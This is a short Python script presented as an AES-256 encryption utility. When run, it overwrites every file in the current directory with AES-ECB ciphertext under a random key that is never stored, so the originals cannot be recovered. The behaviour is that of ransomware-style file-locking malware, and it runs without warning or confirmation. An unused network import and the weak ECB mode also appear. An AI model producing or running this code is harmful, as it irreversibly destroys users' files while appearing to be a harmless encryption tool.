#!/usr/bin/env python3.11
# Import the modules for 256 bit AES encryption
import os
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# Define the encryption key
key = get_random_bytes(32)

# Define the encryption function
def encrypt(data):
    cipher = AES.new(key, AES.MODE_ECB)
    # Pad the data to a multiple of 16 bytes
    padded_data = pad(data, AES.block_size)
    # Encrypt the padded data
    encrypted_data = cipher.encrypt(padded_data)
    # Encode the encrypted data as base64
    encoded_data = base64.b64encode(encrypted_data)
    return encoded_data

# Define the decryption function
def decrypt(data):
    cipher = AES.new(key, AES.MODE_ECB)
    # Decode the base64 data
    decoded_data = base64.b64decode(data)
    # Decrypt the decoded data
    decrypted_data = cipher.decrypt(decoded_data)
    # Unpad the decrypted data
    unpadded_data = unpad(decrypted_data, AES.block_size)
    return unpadded_data

# Define the main function
def main():
    # Get all the files in the current directory
    files = os.listdir()
    # Encrypt each file and replace it with the encrypted version
    for file in files:
        with open(file, "rb") as f:
            data = f.read()
            encrypted_data = encrypt(data)
            with open(file, "wb") as f:
                f.write(encrypted_data)
    print("All files encrypted successfully.")

# Call the main function
if __name__ == "__main__":
    main()